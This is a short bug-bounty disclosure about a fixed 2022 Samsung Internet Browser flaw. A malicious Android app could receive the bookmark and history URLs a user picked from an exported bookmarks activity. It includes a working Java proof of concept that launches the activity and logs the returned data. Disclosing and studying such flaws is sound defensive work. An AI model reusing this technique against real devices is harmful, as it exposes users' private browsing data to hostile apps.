# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Internet Browser</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.sbrowser</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.15</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.06.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$300</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/046.%20Samsung%20Internet%20Browser%20—%20Leakage%20of%20picked%20bookmarks%20and%20history%20URLs/Oversecured_report.png)

The app returned sensitive data that the user interacted with to the attacking app. Examples are bookmarks that the user clicked on.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent("com.sec.android.app.sbrowser.bookmarksDb.ui.ShowBookmarksActivity");
    startActivityForResult(i, 0);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    DumpUtils.dump(data, getClassLoader());
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.
